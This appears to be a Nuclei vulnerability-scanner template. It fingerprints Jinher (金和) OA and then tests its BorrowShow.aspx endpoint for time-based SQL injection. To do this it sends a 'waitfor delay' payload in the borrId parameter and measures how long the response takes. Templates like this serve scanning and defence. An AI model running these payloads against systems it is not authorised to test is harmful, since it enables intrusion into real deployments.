id: poc-yaml-jinher-borrowshow-aspx-sqli
info:
  name: "金和OA BorrowShow.aspx SQL注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(5,10)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - raw:
      - |
        GET /C6/Jhsoft.Web.login/PassWordSlideFull.aspx HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: word
        part: body
        words:
          - "JHSoft"

  - raw:
      - |
        GET /c6/Jhsoft.Web.Archives/BorrowShow.aspx/?borrId=1;waitfor+delay'0:0:{{t1}}'-- HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "SessionId="
      - type: word
        part: body
        words:
          - ""
      - type: dsl
        dsl:
          - "duration >= to_number(t1) && duration <= to_number(t2)"
